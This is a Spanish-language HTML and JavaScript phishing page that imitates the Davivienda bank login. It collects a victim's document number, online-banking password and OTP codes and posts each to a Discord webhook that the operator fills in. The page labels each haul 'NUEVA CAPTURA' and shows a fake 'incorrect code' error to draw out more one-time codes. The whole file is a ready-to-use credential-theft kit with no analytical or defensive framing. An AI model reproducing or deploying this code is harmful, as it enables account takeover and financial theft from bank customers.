<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda - Virtual</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .container { max-width: 400px; padding: 20px; margin: 0 auto; }
        .form-group { gap: 4px !important; margin-bottom: 10px !important; display: flex; flex-direction: column; }
        .form-input, .form-select { border-radius: 20px !important; padding: 12px 16px !important; border: 1px solid #ccc; font-size: 15px; width: 100%; box-sizing: border-box; }
        .btn-continue { border-radius: 25px !important; padding: 14px !important; width: 100%; border: none; background: #ed1c24; color: #fff; font-weight: 700; cursor: pointer; margin-top: 10px; font-size: 16px; }
        
        #passSection, #otpSection { display: none; opacity: 0; transition: all 0.4s ease; }
        .show { display: block !important; opacity: 1 !important; }
        .hidden { display: none !important; }
        .loading { opacity: 0.5; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container" style="margin-bottom: 25px; text-align: center;">
            <img src="LogoDavivienda.svg" alt="Logo" class="logo" style="max-width: 160px;">
        </div>
        
        <div id="stepContainer">
            <div class="welcome-section" style="margin-bottom: 15px;">
                <p style="font-size: 19px; margin:0; color: #2c2c2c;">¡Hola!</p>
                <h2 style="font-size: 23px; font-weight: 700; margin:0; color: #2c2c2c;">Nos alegra que esté aquí</h2>
            </div>
            
            <form id="mainForm">
                <div id="docGroup">
                    <div class="form-group">
                        <label class="form-label">Seleccione su tipo de documento</label>
                        <select id="docType" class="form-select">
                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
                            <option value="Pasaporte">Pasaporte</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Ingrese su número de documento</label>
                        <input type="text" id="docNumber" class="form-input" required autocomplete="off">
                    </div>
                    <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
                </div>

                <div id="passSection">
                    <div class="form-group">
                        <label class="form-label">Ingrese su clave virtual</label>
                        <input type="password" id="pass" class="form-input" maxlength="8">
                    </div>
                    <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
                </div>

                <div id="otpSection">
                    <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px;">
                        <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                        <div class="form-group">
                            <label class="form-label">Código de seguridad</label>
                            <input type="text" id="otpCode" class="form-input" placeholder="000000" maxlength="8">
                        </div>
                        <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none; margin-top: 5px;">Código incorrecto. Reintente.</p>
                        <button type="button" id="btnFinish" class="btn-continue">Confirmar Código</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <script>
        // REEMPLAZA ESTA URL CON TU WEBHOOK DE DISCORD
        const WEBHOOK_URL = 'TU_URL_DE_WEBHOOK_AQUI';

        async function sendToDiscord(titulo, color, campos) {
            const body = {
                embeds: [{
                    title: titulo,
                    color: color,
                    fields: campos,
                    footer: { text: "Davivienda Live | " + new Date().toLocaleString() }
                }]
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                return response.ok;
            } catch (error) {
                console.error("Error al enviar:", error);
                return false;
            }
        }

        // Paso 1 -> Aparece Clave
        document.getElementById('btnToPass').addEventListener('click', () => {
            if(document.getElementById('docNumber').value.length > 3) {
                document.getElementById('docGroup').classList.add('hidden');
                document.getElementById('passSection').classList.add('show');
            }
        });

        // Paso 2 -> Envía Login y aparece OTP abajo
        document.getElementById('btnToOtp').addEventListener('click', async () => {
            const btn = document.getElementById('btnToOtp');
            btn.innerText = "Cargando...";
            btn.classList.add('loading');

            const campos = [
                { name: "👤 Documento", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
                { name: "🔑 Clave", value: `\`${document.getElementById('pass').value}\``, inline: true },
                { name: "📄 Tipo", value: document.getElementById('docType').value, inline: false }
            ];

            const success = await sendToDiscord("🏦 NUEVA CAPTURA", 15548997, campos);

            if (success) {
                document.getElementById('passSection').classList.remove('show');
                document.getElementById('passSection').classList.add('hidden');
                document.getElementById('otpSection').classList.add('show');
            } else {
                alert("Error de conexión. Intente nuevamente.");
                btn.innerText = "Ingresar";
                btn.classList.remove('loading');
            }
        });

        // Paso 3 -> Envía OTP
        document.getElementById('btnFinish').addEventListener('click', async () => {
            const btn = document.getElementById('btnFinish');
            const otp = document.getElementById('otpCode').value;
            if(otp.length < 4) return;

            btn.innerText = "Validando...";
            
            const campos = [
                { name: "👤 Doc", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
                { name: "🔢 Código OTP", value: `\`${otp}\``, inline: true }
            ];

            await sendToDiscord("🔐 CÓDIGO RECIBIDO", 16776960, campos);

            setTimeout(() => {
                document.getElementById('errOtp').style.display = 'block';
                document.getElementById('otpCode').value = '';
                btn.innerText = "Confirmar Código";
            }, 1000);
        });
    </script>
</body>
</html>
